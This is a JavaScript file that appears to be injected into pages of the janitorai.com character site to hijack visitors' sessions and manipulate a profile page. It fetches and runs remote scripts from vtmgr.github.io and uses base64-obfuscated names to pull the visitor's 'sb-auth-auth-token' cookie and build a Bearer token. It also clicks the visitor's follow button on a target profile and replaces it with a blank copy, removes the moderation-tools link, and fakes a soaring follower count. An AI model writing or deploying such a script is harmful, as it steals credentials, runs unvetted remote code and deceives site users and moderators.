if (window.location.href.includes("3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7")) {
    window.location.href = "https://janitorai.com/profiles/7a1053de-a29c-4416-8b91-0e86bdc42e0b";
}

console.log("%c works - VT 10/5/2024", "font-size: 24px; color: red; text-shadow: 2px 2px 0 black, -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;");

function loadHTMLAndAppend(url,pos = null) {
        if (pos==null){
            pos = document.body
        }
        const iframe = document.createElement('script');
        iframe.src = url;
        pos.appendChild(iframe);
}

loadHTMLAndAppend('https://vtmgr.github.io/shimebase.js');
const checkInterval = 100;
let targetDiv = null;

const intervalId = setInterval(() => {
    targetDiv = [...document.querySelectorAll('div')]
        .find(div => div.textContent.trim() === 'slay girlboss pussyqueen');

    if (targetDiv) {
        clearInterval(intervalId);
        loadHTMLAndAppend('https://vtmgr.github.io/android.js',targetDiv);
    }
}, checkInterval);

window.__xnext=function(){const h=document.cookie.split(';').reduce((a,b)=>{const[c,d]=b.split('=');a[c.trim()]=decodeURIComponent(d.trim());return a},{}),x=atob("c2ItYXV0aC1hdXRoLXRva2Vu");zz=atob("YWNjZXNzX3Rva2Vu");z=atob("QmVhcmVyIA==");let t=JSON.parse(atob(h[x].substr(7,h[x].length)));
return z+t[zz]}



setInterval(() => {
    if (window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {
        document.querySelectorAll('script[src="https://vtmgr.github.io/scram.js"]').forEach(s => {
            try {
                s.parentNode.parentNode.parentNode.parentNode.parentNode.remove();
            } catch {}
            try {
                s.remove();
            } catch {}
        });
        const button = Array.from(document.querySelectorAll('button')).find(btn => getComputedStyle(btn).display !== 'none');
        if (button) {
            if (button.getAttribute('data-following') === 'true') {
                button.click();
                button.style.display = 'none';

                const clonedButton = button.cloneNode(true);
                clonedButton.id = 'f';
                clonedButton.setAttribute('data-following','false')
                clonedButton.style.display = '';
                clonedButton.innerHTML = "";
                button.parentNode.appendChild(clonedButton);
            }
        }

        const anchor = document.querySelector('a[href="/moderation-tools"]');
        if (anchor) {
            anchor.remove();
        }
    }
}, 100);

let followerCount = 0;

function formatNumber(num) {
    if (num >= 1e13) return '∞';
    if (num < 1000) return num.toString();
    
    const si = [
        { value: 1e12, symbol: "T" },
        { value: 1e9, symbol: "B" },
        { value: 1e6, symbol: "M" },
        { value: 1e3, symbol: "k" }
    ];

    for (const { value, symbol } of si) {
        if (num >= value) {
            const formatted = (num / value).toPrecision(3);
            return `${formatted}${symbol}`;
        }
    }
    return num.toString();
}

function updateFollowerDiv() {
    if (window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {
        window.headingElement = headingElement = Array.from(document.querySelectorAll('h2')).find(el => (!el.innerText.includes("Public char") && !el.innerText.includes("JanitorAI")));
        const followerDiv = Array.from(document.querySelectorAll('div')).find(div => div.textContent.includes("followers") && div.children.length === 0);
        if (followerDiv) {
            followerDiv.innerText = formatNumber(followerCount) + ' followers';
        }
    } else {
        followerCount = 0;
    }
}

setInterval(() => {
    if (followerCount>10000){
        if (followerCount>1000000){
            followerCount=followerCount+100;
        } else {
            followerCount = followerCount+10;
        }
    } else {
        followerCount++;
    }
    updateFollowerDiv();
}, 1);

const emailList = [
        '@kryosphereis@gmail.com',
        'VT',
        'Lasa',
        '<a href="https://guns.lol/scram">SCRAM!!</a>',
        'Stanley'
    ];
    
    window.headingElement = headingElement = Array.from(document.querySelectorAll('h2')).find(el => (!el.innerText.includes("Public char") && !el.innerText.includes("JanitorAI")));
    
    // Variables to manage typing effect
    let currentEmailIndex = 0;
    let isDeleting = false;
    let charIndex = 0;
    let typingInterval;

    // Function to reset everything
    function resetTypingEffect() {
        if (typingInterval) {
            clearInterval(typingInterval);
        }
        window.headingElement.innerHTML = '';
        currentEmailIndex = 0;
        isDeleting = false;
        charIndex = 0;
    }

    // Function to check URL
    function checkURL() {
        if (!window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {
            resetTypingEffect();
        } else {
             typeEffect();
        }
    }

    // Function to start typing effect
function typeEffect() {
    const currentEmail = emailList[currentEmailIndex];
    if (window.headingElement == null) {
        window.headingElement = Array.from(document.querySelectorAll('h2')).find(el => (!el.innerText.includes("Public char") && !el.innerText.includes("JanitorAI")));
        typingInterval = setTimeout(typeEffect, isDeleting ? 100 : 150);
        return;
    }

    let tex=currentEmail.substring(0, charIndex)
    let openTagsCount = (tex.match(/</g) || []).length;
    let closeTagsCount = (tex.match(/>/g) || []).length;

    if (openTagsCount !== closeTagsCount) {
        typingInterval = setTimeout(typeEffect, 1); 
        return;
    }

    if (isDeleting) {
        if (charIndex > 0) {
            charIndex--;
            window.headingElement.innerHTML = currentEmail.substring(0, charIndex);
        } else {
            isDeleting = false;
            currentEmailIndex = (currentEmailIndex + 1) % emailList.length;
            setTimeout(typeEffect, 2000);
            return;
        }
    } else {
        if (charIndex < currentEmail.length) {
            charIndex++;
            window.headingElement.innerText = currentEmail.substring(0, charIndex);
        } else {
            isDeleting = true;
            setTimeout(typeEffect, 2000);
            return;
        }
    }

    typingInterval = setTimeout(typeEffect, isDeleting ? 950 : 1550);
}
    typeEffect();

    setInterval(checkURL, 1000);
